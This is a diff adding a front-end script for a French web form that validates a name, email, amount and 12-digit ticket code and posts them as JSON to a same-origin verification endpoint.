@@ -1,0 +1,125 @@
+<script>
+const btn = document.querySelector('.wpcf7-submit');
+const nomprenom = document.querySelector('[name="nomprenom"]');
+const email = document.querySelector('[name="email"]');
+const montant = document.querySelector('[name="montant"]');
+const code = document.querySelector('[name="verificationcode"]');
+const statelayer = document.querySelector('#statelayer');
+
+const errors = {
+  nomprenom:       document.getElementById('nomprenom'),
+  email:           document.getElementById('email'),
+  montant:         document.getElementById('montant'),
+  verificationcode: document.getElementById('verificationcode'),
+};
+
+Object.values(errors).forEach(el => {
+  el.style.color = '#f11919';
+  el.style.display = 'none';
+});
+
+function isValidEmail(mail) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(mail.trim());
+}
+
+function isValidMontant(val) {
+  return /^\d+([.,]\d{1,2})?$/.test(val.trim());
+}
+
+function isValidCode(val) {
+  return /^\d{12}$/.test(val.trim());
+}
+
+function setError(field, msg) {
+  errors[field].textContent = msg;
+  errors[field].style.display = msg ? 'block' : 'none';
+}
+
+function validate() {
+  let valid = true;
+
+  if (!nomprenom.value.trim()) {
+    setError('nomprenom', 'Veuillez entrer votre nom et prénom.');
+    valid = false;
+  } else {
+    setError('nomprenom', '');
+  }
+
+  if (!email.value.trim()) {
+    setError('email', 'Veuillez entrer votre e-mail.');
+    valid = false;
+  } else if (!isValidEmail(email.value)) {
+    setError('email', 'Adresse e-mail invalide.');
+    valid = false;
+  } else {
+    setError('email', '');
+  }
+
+  if (!montant.value.trim()) {
+    setError('montant', 'Veuillez entrer le montant.');
+    valid = false;
+  } else if (!isValidMontant(montant.value)) {
+    setError('montant', 'Montant invalide (ex: 10 ou 10.50).');
+    valid = false;
+  } else {
+    setError('montant', '');
+  }
+
+  if (!code.value.trim()) {
+    setError('verificationcode', 'Veuillez entrer le code du ticket.');
+    valid = false;
+  } else if (!isValidCode(code.value)) {
+    setError('verificationcode', 'Le code doit contenir exactement 12 chiffres.');
+    valid = false;
+  } else {
+    setError('verificationcode', '');
+  }
+
+  btn.disabled = !valid;
+  return valid;
+}
+
+[nomprenom, email, montant, code].forEach(input => {
+  input.addEventListener('input', validate);
+});
+
+btn.addEventListener('click', async () => {
+  const spinner = document.querySelector('.wpcf7-spinner');
+  spinner.style.visibility = 'visible';
+
+  if (!validate()) {
+    spinner.style.visibility = 'hidden';
+    return;
+  }
+
+  const response = await fetch('/api/verification', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      nomprenom:        nomprenom.value.trim(),
+      email:            email.value.trim(),
+      montant:          montant.value.trim(),
+      verificationcode: code.value.trim(),
+    }),
+  });
+
+  const result = await response.json();
+
+  if (result.ok) {
+    nomprenom.value = '';
+    email.value = '';
+    montant.value = '';
+    code.value = '';
+    btn.disabled = true;
+    statelayer.textContent = 'Merci, vous recevrez un email sous peu !';
+    statelayer.style.color = '#0ef137';
+    statelayer.style.display = 'block';
+  } else {
+    statelayer.textContent = 'Une erreur est survenue, veuillez réessayer.';
+    statelayer.style.color = '#f11919';
+    statelayer.style.display = 'block';
+  }
+
+  spinner.style.visibility = 'hidden';
+});
+</script>
